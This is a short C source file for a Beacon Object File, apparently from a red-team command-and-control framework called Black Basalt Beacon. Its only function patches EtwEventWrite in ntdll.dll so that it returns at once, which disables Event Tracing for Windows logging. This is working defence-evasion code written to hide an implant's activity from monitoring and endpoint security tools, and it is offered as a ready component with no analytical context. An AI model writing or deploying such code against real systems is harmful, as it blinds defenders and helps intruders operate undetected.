/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"
extern PVOID __imp_GetModuleHandleA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_VirtualProtect;
extern PVOID __imp_RtlCopyMemory;
void go(char *a,int l){
    BeaconPrintf(CALLBACK_OUTPUT,"[ETW] patching...\n");
    HMODULE ntdll=(HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_GetModuleHandleA)("ntdll.dll");
    if(!ntdll)return;
    FARPROC ew=(FARPROC)((FARPROC(WINAPI*)(HMODULE,LPCSTR))__imp_GetProcAddress)(ntdll,"EtwEventWrite");
    if(!ew)return;
    DWORD old;
    if(((BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))__imp_VirtualProtect)(ew,1,PAGE_EXECUTE_READWRITE,&old)){
        BYTE ret[]={0xC3};  // ret
        ((void(WINAPI*)(PVOID,PVOID,SIZE_T))__imp_RtlCopyMemory)(ew,ret,1);
        ((BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))__imp_VirtualProtect)(ew,1,old,&old);
        BeaconPrintf(CALLBACK_OUTPUT,"[ETW] patched\n");
    }
}
